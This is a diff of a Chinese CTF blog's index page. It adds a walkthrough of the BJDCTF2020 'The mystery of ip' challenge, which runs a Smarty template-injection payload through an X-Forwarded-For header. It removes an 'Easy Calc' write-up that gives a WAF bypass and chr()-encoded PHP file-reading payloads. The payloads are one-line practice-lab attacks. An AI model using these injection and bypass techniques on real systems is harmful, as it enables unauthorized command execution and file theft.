@@ -288,6 +288,152 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/02/06/20210206/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="花间一壶酒">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2021/02/06/20210206/" itemprop="url">（BJDCTF2020）The mystery of ip</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-02-06T17:17:45+08:00">
+                2021-02-06
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h2><p><img src="https://img-blog.csdnimg.cn/20210209213259155.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">分别查看flag.php和hint.php<br><img src="https://img-blog.csdnimg.cn/20210209213322998.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/20210209213335649.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20210209213945136.png" alt="在这里插入图片描述">猜想是xff或者client-ip，抓包<br><img src="https://img-blog.csdnimg.cn/20210209214317221.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">确定是xff</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45521281/article/details/107556915">smarty模板注入</a></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: &#123;system(&#x27;cat /flag&#x27;)&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210209214510520.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://example.com/2021/02/05/20210205/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1625,155 +1771,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/01/27/20210127/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="花间一壶酒">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2021/01/27/20210127/" itemprop="url">（RoarCTF 2019）Easy Calc</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-01-27T17:17:45+08:00">
-                2021-01-27
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/web/" itemprop="url" rel="index">
-                    <span itemprop="name">web</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><p><img src="https://img-blog.csdnimg.cn/20210204132856427.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">查看源码</p>
-<p><img src="https://img-blog.csdnimg.cn/20210204133037316.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20210204133116947.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">提示设置了WAF以确保安全，尝试访问<code>calc.php</code>：</p>
-<p><img src="https://img-blog.csdnimg.cn/20210204133218401.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">WAF限制了参数num，将传入的参数’num’前添加空格，即’? num’可绕过WAF的判断，将字符/使用char(47)表示：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">? num=<span class="number">1</span>;var_dump(scandir(chr(<span class="number">47</span>)))</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210204133345279.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">在返回的文件中有f1agg文件，将其转化为ASCII编码，使用<code>file_get_contents()</code>函数读取文件：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">? num=<span class="number">1</span>;var_dump(file_get_contents(chr(<span class="number">47</span>).chr(<span class="number">102</span>).chr(<span class="number">49</span>).chr(<span class="number">97</span>).chr(<span class="number">103</span>).chr(<span class="number">103</span>)))</span><br></pre></td></tr></table></figure>
-
-<p>得到flag<br><img src="https://img-blog.csdnimg.cn/20210204133618107.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -1824,7 +1821,7 @@
               
                 <a href="/archives%7C%7C%20archive">
               
-                  <span class="site-state-item-count">59</span>
+                  <span class="site-state-item-count">60</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
